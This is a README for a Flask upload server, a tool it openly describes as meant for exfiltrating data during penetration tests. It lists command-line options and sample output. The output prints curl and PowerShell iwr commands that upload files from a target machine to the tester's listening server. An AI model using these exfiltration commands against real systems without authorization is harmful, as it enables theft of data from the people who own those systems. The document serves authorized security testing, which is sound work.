# Flask Upload Server
Flask server to exfiltrate data during penetration tests.

# Usage
`uploadserver.py [-h] [-o UPLOAD_FOLDER] [-i INTERFACE] [-p PORT]`


```
-h, --help                                             show this help message and exit
  
  -o UPLOAD_FOLDER, --upload-folder UPLOAD_FOLDER      The path where uploaded files will be stored (default: uploads)
                        
  -i INTERFACE, --interface INTERFACE                  Network interface to run the server on (default: eth0)
                        
  -p PORT, --port PORT                                 Port number to run the server on (default: 80)
```

# Sample Output

![Screenshot_002372](https://github.com/piercecohen1/flask-upload-server/assets/19575201/bc250694-23da-48aa-9136-1493a368f5cc)


```
└─$ python3 uploadserver.py -i tun0

Server running on 10.10.14.20:80 (interface: tun0)

To upload a file from Linux:
curl -F "file=@myfile.txt" http://10.10.14.20:80/upload/myfile.txt

To upload a file from Windows:
iwr -Uri "http://10.10.14.20:80/upload/myfile.txt" -Method Post -Infile "myfile.txt"

 * Serving Flask app 'uploadserver'
 * Debug mode: off
```
